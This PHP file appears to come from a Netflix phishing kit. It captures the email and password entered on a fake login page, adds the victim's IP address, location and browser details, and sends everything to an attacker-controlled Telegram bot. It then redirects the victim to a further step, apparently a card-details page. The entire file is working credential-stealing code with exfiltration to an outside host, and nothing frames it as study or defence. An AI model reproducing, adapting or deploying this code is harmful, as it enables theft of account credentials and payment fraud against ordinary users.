<?php

session_start();

include ("panel.php");
include ("config.php");

// Get form data
$email = $_POST['userLoginId']; 
$password = $_POST['password'];

// Construct the message with BIN and brand information
$message = '
     📺 | ▶️  𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐑𝐙𝐋𝐓𝐒  ▶️ | 📺

    ☛  💲  ☚  +𝟏 𝐋𝐎𝐆𝐈𝐍 𝐍𝐓𝐅𝐋𝐗 ☛  💲  ☚

🍒 𝑬𝒎𝒂𝒊𝒍 : ' . $email . '
🍒 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅 : ' . $password . '


[🔋] 𝐓𝐢𝐞𝐫𝐬 [🔋]

📡 Adresse Ip : ' . $_SERVER['REMOTE_ADDR'] . '
🌐 City : ' . $city . '
🌐 Country : ' . $country . '
🤖 User-agent : ' . $_SERVER['HTTP_USER_AGENT'] . '
';

$banip = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/banip/banip.php?type=blocked&ip=' . urlencode(_ip()) . '&id=' . $randomId;



// Define the inline keyboard markup
$inlineKeyboard = [
    [
        ["text" => "𝐁𝐚𝐧 𝐁𝐚𝐧 🚫 ", "url" => $banip],
    ],
];

// Convert the inline keyboard array to JSON
$keyboardMarkup = json_encode(["inline_keyboard" => $inlineKeyboard]);

// Manually create the reply_markup string
$replyMarkup = "&reply_markup=" . urlencode($keyboardMarkup);

// Construct the message with the updated reply_markup
$telegramMessage = "$message$replyMarkup";

$telegramUrl = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($message).'&parse_mode=HTML'.$replyMarkup;

$html = file_get_contents($telegramUrl);

if ($html === false) {
    // Error handling: Telegram message was not sent
    echo "404 Not Found.";
} else {
    // Success handling: Telegram message sent
    // Redirect to card.php
    header("Location: ../step1.php?&sessionid={$randString}&ue={$randString}");
    exit; // Ensure that the script stops executing after the redirection
}
?>